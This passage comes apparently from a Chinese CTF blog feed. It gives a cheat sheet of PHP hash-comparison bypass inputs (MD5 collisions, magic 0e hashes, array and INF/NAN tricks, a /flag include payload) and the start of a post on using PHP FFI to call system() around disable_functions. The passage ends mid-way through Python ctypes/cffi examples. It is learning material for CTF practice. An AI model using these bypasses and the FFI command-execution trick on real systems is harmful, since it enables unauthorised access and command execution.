&lt;pre tabindex="0">&lt;code>a=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP
b=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5md5b--ab">md5($a)==md5(md5($b)) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>数组绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>a=&amp;amp;b[]=1
&lt;/code>&lt;/pre>&lt;h2 id="md5string_getamd5md5string_getb--ab">md5((string)$_GET[&amp;lsquo;a&amp;rsquo;])==md5(md5((string)$_GET[&amp;lsquo;b&amp;rsquo;])) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>0e绕过，一个是正常0e，一个是第二次md5后还为0e的奇葩值&lt;/p>
&lt;pre tabindex="0">&lt;code>aawBzC
aabsbm9
aaaabGG5T
aaaabKGVH
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b--ctype_alphaa--is_numericb">md5($a)==md5($b) &amp;amp;&amp;amp; !ctype_alpha($a) &amp;amp;&amp;amp; !is_numeric($b)&lt;/h2>
&lt;p>0e绕过，一个纯数字一个纯字母&lt;/p>
&lt;pre tabindex="0">&lt;code>240610708 -&amp;gt; 0e462097431906509019562988736854
QNKCDZO -&amp;gt; 0e830400451993494058024219903391
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b----ab">md5($a)===md5($b) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>数组绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5md5b--ab-1">md5($a)===md5(md5($b)) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>数组绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b----ab-1">md5($a)===md5($b) &amp;amp;&amp;amp; $a!==$b&lt;/h2>
&lt;p>数组绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="ahashmd4a">$a!=hash(&amp;ldquo;md4&amp;rdquo;,$a)&lt;/h2>
&lt;p>0e纯数字绕过&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;0e&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$md4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">hash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/^0e[0-9]*$/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$md4&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4加密前:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4加密后：&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$md4&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>0e251288019 -&amp;gt; 0e874956163641961271069404332409
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b--ab--strlena3--strlenb3">md5($a)===md5($b) &amp;amp;&amp;amp; $a!==$b &amp;amp;&amp;amp; strlen($a)&amp;lt;=3 &amp;amp;&amp;amp; strlen($b)&amp;lt;=3&lt;/h2>
&lt;p>INF表示无穷大，而NAN表示一个在浮点数运算中未定义或不可表述的值；除了与True之外，拿NAN与其他任何值进行松散比较或者严格比较返回结果都是FALSE
因为他们都是不确定的值，所以在与自身做比较时，会返回false&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030175015724.png" alt="image-20211030175015724">&lt;/p>
&lt;p>INF和NAN绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>a=INF&amp;amp;b=INF
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>a=NAN&amp;amp;b=NAN
&lt;/code>&lt;/pre>&lt;h2 id="this-syc--this-lover--md5this-syc--md5this-lover--sha1this-syc-sha1this-lover">($this-&amp;gt;syc != $this-&amp;gt;lover) &amp;amp;&amp;amp; (md5($this-&amp;gt;syc) === md5($this-&amp;gt;lover)) &amp;amp;&amp;amp; (sha1($this-&amp;gt;syc)=== sha1($this-&amp;gt;lover))&lt;/h2>
&lt;p>做题遇到的&lt;/p>
&lt;p>用原生类&lt;code>Error&lt;/code>（php7）或&lt;code>Exception&lt;/code>（php5 or 7），它有&lt;code>__toString&lt;/code>方法，被触发后会以字符串形式输出当前保存情况，包括错误信息和当前报错的行号，而跟传入的参数没有关系；所以说可以构造两个类的实例，它们行号相同（被&lt;code>__toString&lt;/code>调用后输出信息一样），但是本身不相同（传入参数不等）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;lt;?=include~&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 这个不重要 是那个题的payload
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SYCLOVER&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">lover&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意$a和$b写到一行&lt;/p>
&lt;h2 id="this-token--this-token_flag">$this-&amp;gt;token === $this-&amp;gt;token_flag&lt;/h2>
&lt;p>指针取地址绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>$F-&amp;gt;token=&amp;amp;$F-&amp;gt;token_flag;
&lt;/code>&lt;/pre></description></item><item><title>FFI绕过disable_functions</title><link>https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/</link><pubDate>Fri, 03 Dec 2021 00:01:07 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/</guid><description>&lt;p>废话不多说，直接进入正题；文中参考链接统一扔后面了&lt;/p>
&lt;h2 id="preloading">Preloading&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/preload">PHP RFC: Preloading&lt;/a> | php7.4启用&lt;/li>
&lt;/ul>
&lt;p>预加载文件到opcache中，类不能有不可达的父类、接口，also only top-level entities are not nested with control structures (e.g. if()&amp;hellip;)may be preloaded；被加载后除非重启，进行的修改不影响当前进程；预加载不影响静态类成员和变量的表现；Windows中不能预加载从内部继承的类（Windows ASLR and absence of fork() don&amp;rsquo;t allow to guarantee the same addresses of internal classes in different processes.）；多版本有可能造成bug&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202161008294.png" alt="image-20211202161008294">&lt;/p>
&lt;h2 id="ffi">FFI&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/ffi">PHP RFC: FFI - Foreign Function Interface&lt;/a> | php7.4启用&lt;/li>
&lt;/ul>
&lt;p>文档中给了一个小栗子&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75715e">// create FFI object, loading libc and exporting function printf()
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">FFI&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;int printf(const char *format, ...);&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// this is regular C declaration
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;libc.so.6&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">// call C printf()
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$ffi&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello %s!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>直接运行即可输出Hello world!；这个函数的原型是这样的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#75af00">FFI&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">cdef&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">$cdef&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#111">[,&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">$lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">]])&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">FFI&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>书写的形式相当的简洁，创建FFI对象（声明）-&amp;gt;调用c方法；试着直接执行一个whoami&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">php -r &lt;span style="color:#d88200">&amp;#39;$ffi = FFI::cdef(&amp;#34;int system(char *command);&amp;#34;);$ffi-&amp;gt;system(&amp;#34;whoami&amp;#34;);&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>发现在没有第二个参数的情况下也可以正常执行system函数，看下&lt;a href="https://github.dev/php/php-src/blob/d29e93870ab2141e8a38cccefb81553f0b16cbfe/ext/ffi/ffi.c#L2853-L2879">源码&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202231908072.png" alt="image-20211202231908072">&lt;/p>
&lt;p>这种情况下lib=NULL，handle=RTLD_DEFAULT（这个注释TODO就很灵性）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202232422896.png" alt="image-20211202232422896">&lt;/p>
&lt;p>随后调用&lt;code>DL_FETCH_SYMBOL&lt;/code>，&lt;a href="https://github.dev/php/php-src/blob/d29e93870ab2141e8a38cccefb81553f0b16cbfe/Zend/zend_portability.h#L166-L168">也就是&lt;/a>dlsysm&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202232601190.png" alt="image-20211202232601190">&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>RTLD_DEFAULT&lt;/strong>&lt;/p>
&lt;p>Find the first occurrence of the desired symbol using the default shared object search order. The search will include global symbols in the executable and its dependencies, as well as symbols in shared objects that were dynamically loaded with the &lt;strong>RTLD_GLOBAL&lt;/strong>flag.&lt;/p>
&lt;/blockquote>
&lt;p>当dlsym第一个参数为RTLD_DEFAULT时，会按照默认共享库顺序查找system的位置，搜索范围还包括了可执行程序极其依赖中的函数表（如果设置了 RTLD_GLOBAL还会搜索动态加载库中的函数表），也就是直接在全局符号表里找了，所以不需要指定加载库，fopen这类函数也是一样&lt;/p>
&lt;p>更多的栗子请参见&lt;a href="https://wiki.php.net/rfc/ffi">文档&lt;/a>和&lt;a href="https://www.laruence.com/2020/03/11/5475.html">这一篇文章&lt;/a>，写的都很详细&lt;/p>
&lt;h3 id="跑个题ffi-in-python">跑个题：FFI in Python&lt;/h3>
&lt;p>Python的优点就不必说了，缺点是封装太好了导致运行速度上不去，那为什么不直接在Python中用C/C++呢？&lt;/p>
&lt;p>肥肠不错的想法！不过要解决的有两个问题：Marshalling（感觉编组这个翻译很奇怪 但是这个行为可以类比一下serialize） &amp;amp; Manageing Memory（内存管理）&lt;/p>
&lt;ul>
&lt;li>Python中万物皆object，而C中有严格的int float等等类型&lt;/li>
&lt;li>Python有gc，而C中需要手动malloc&lt;/li>
&lt;/ul>
&lt;p>不过不急，已经有库封装好了这些功能可以直接使用，来康康demo&lt;/p>
&lt;h4 id="ctypes库">ctypes库&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#75af00">cadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;In cadd: int %d float %.1f returning %.1f&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pathlib&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#75715e"># load the lib&lt;/span>
&lt;span style="color:#111">libname&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pathlib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Path&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">absolute&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#d88200">&amp;#34;libcadd.so&amp;#34;&lt;/span>
&lt;span style="color:#111">c_lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">CDLL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">libname&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2.3&lt;/span>
&lt;span style="color:#75715e"># define the return type&lt;/span>
&lt;span style="color:#111">c_lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cadd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">restype&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_float&lt;/span>
&lt;span style="color:#75715e"># call the function with the correct argument types&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c_lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_float&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;In python: int: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> float &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">.1f&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> return val &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">.1f&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ gcc -shared -Wl,-soname,libcadd -o libcadd.so -fPIC cadd.c
$ python3 test.py
In cadd: int &lt;span style="color:#ae81ff">6&lt;/span> float 2.3 returning 8.3
In python: int: &lt;span style="color:#ae81ff">6&lt;/span> float 2.3 &lt;span style="color:#00a8c8">return&lt;/span> val 8.3
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202173119818.png" alt="image-20211202173119818">&lt;/p>
&lt;p>可以看到成功调用了cadd.so，而我们在python中要做的只有加载.so-&amp;gt;设置符合C标准的返回值类型-&amp;gt;调用，肥肠的简单&lt;/p>
&lt;p>不过标准库ctypes有一些缺陷 并且不能拓展大型项目，鉴于此我们可以使用cffi库&lt;/p>
&lt;h4 id="cffi库">cffi库&lt;/h4>
&lt;p>这里是一个hello world的小demo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75715e"># 可以定义函数 结构体 变量&lt;/span>
&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#d88200"> int printf(const char *format, ...);
&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dlopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 加载c命名空间&lt;/span>
&lt;span style="color:#111">arg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;char[]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 即 char arg[]=&amp;#34;world&amp;#34;;&lt;/span>
&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">arg&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个栗子里直接在一个py文件中用cffi调用库函数就结束了，肥肠肥肠的简单；或者也可以和ctypes一样，单独写一个c先&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">Tadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">Tprint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
